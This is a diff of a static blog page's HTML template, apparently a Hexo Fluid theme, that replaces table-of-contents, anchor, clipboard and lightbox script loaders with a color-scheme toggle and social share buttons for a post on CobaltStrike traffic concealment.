-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      collapseDepth   : CONFIG.toc.collapseDepth || 0,
-      scrollSmooth    : true,
-      headingsOffset  : -boardTop
-    });
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
 
   
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-  });
-</script>
+<script src="/js/colorscheme.js"></script>
 
 
+
+
+
+        
   
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script  src="/js/local-search.js" ></script>
-
-
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
-
-
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + CobaltStrike%E6%B5%81%E9%87%8F%E9%9A%90%E5%8C%BF + '&url=' + http%3A%2F%2Fexample.com%2Fposts%2Fa28d2b5c%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/posts/a28d2b5c/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
   
+  
+<script src="/js/shares.js"></script>
 
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
-</body>
+
+
+      </div>
+    </div>
+  </body>
 </html>
